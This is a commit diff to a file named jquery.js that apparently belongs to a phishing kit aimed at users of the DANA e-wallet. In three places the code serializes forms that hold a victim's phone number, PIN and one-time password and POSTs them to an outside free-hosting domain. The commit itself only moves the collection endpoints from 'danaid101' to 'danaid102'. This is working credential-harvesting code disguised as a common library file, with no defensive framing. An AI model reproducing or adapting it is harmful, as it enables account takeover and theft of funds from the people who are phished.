a6303bc2c9560f759495102a12d6216aa8226b4d
dodypribadi5 <dodypribadi5@gmail.com>
2025-01-08 19:44:12 +0700

    Update jquery.js

--- web/jquery.js
+++ web/jquery.js
@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid101/one.php',
+			  url: 'https://chroedevsi.whf.bz/danaid102/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid101/two.php',
+			  url: 'https://chroedevsi.whf.bz/danaid102/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid101/three.php',
+			  url: 'https://chroedevsi.whf.bz/danaid102/three.php',
 			  data: dataString,
  
         
